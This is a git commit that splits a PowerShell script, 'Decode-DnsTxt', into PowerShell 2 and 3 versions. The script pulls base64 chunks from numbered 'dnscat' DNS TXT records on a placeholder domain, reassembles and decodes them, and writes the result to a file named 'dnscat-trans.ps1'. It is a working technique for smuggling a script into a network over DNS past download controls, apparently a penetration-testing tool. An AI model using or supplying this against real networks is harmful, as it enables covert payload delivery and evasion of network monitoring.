76df277db6968ea800b7636e74848ad90573091a
tautology0 <dave@tautology.org.uk>
2016-10-17 15:18:17 +0100

    Split PS2 and PS3 versions of Decode-DnsTxt

---
+++ Decode-DnsTxt-ps3.ps1
@@ -0,0 +1,11 @@
+﻿$d="my.domain.co.uk"
+$dr=(Resolve-DnsName -Name "dnscatcount.$d" -Type txt).Strings
+$c=[convert]::ToInt32($dr,10)
+$o=@()
+for ($i=1;$i -le $c;$i++)
+{
+    $n="dnscat" + $i.toString() + ".$d"
+	$o+=(Resolve-DnsName -Name $n -Type txt).Strings
+}
+$b64=-join $o
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) | Add-Content "dnscat-trans.ps1"
--- Decode-DnsTxt.ps1
+++ Decode-DnsTxt.ps1
@@ -1,25 +1,19 @@
 ﻿$d="my.domain.co.uk"
-# If PS 3 use the below
- #$dr=(Resolve-DnsName -Name "dnscatcount.$d" -Type txt).Strings
-# Else if PS 2
- $cm="dnscatcount.$d"
- $co=(Invoke-Command -ScriptBlock {nslookup -type=txt $cm} 2>$null)
- $coa=([String]$co).Split('"')
- $dr=$coa[6]
-# Endif
+$cm="dnscatcount.$d"
+$co=(Invoke-Command -ScriptBlock {nslookup -type=txt $cm} 2>$null)
+$coa=([String]$co).Split('"')
+$dr=$coa[6]
+
 $c=[convert]::ToInt32($dr,10)
 $o=@()
 for ($i=1;$i -le $c;$i++)
 {
     $n="dnscat" + $i.toString() + ".$d"
-	# if PS 2
     $co=(Invoke-Command -ScriptBlock {nslookup -type=txt $n} 2>$null)
     $coa=([String]$co).Split('"')
     $dr=$coa[6]	
     $o+=$dr
     Start-Sleep -s 1
-	# else if PS 3
-    #$o+=(Resolve-DnsName -Name $n -Type txt).Strings
 }
 $b64=-join $o
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) | Add-Content "dnscat-trans.ps1"
